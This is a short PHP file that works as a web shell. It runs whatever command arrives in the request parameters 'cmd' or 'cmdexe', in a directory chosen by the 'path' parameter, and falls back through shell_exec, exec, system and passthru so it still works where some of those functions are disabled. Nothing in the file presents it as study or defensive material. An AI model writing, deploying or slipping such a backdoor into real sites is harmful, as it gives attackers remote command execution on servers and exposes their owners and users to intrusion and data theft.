<?php
function cmd($cmd)
{
    chdir($_GET['path']);
    $res="";
    if($_GET['cmdexe'])
    {
        $cmd=$_GET['cmdexe'];
    }
    if(function_exists('shell_exec'))
    {
        $res=shell_exec($cmd);
    }
    else if(function_exists('exec'))
    {
        exec($cmd,$res);
        $res=join("\n",$res);
    }
    else if(function_exists('system'))
    {
        ob_start();
        system($cmd);
        $res = ob_get_contents();
        ob_end_clean();   
    }
    elseif(function_exists('passthru'))
    {
		ob_start();
		passthru($cmd);
		$res=ob_get_contents();
		ob_end_clean();
    }
    
    
    $res=wordwrap(htmlspecialchars($res));
    return $res;
}

echo "start";
cmd($_POST['cmd']);

?>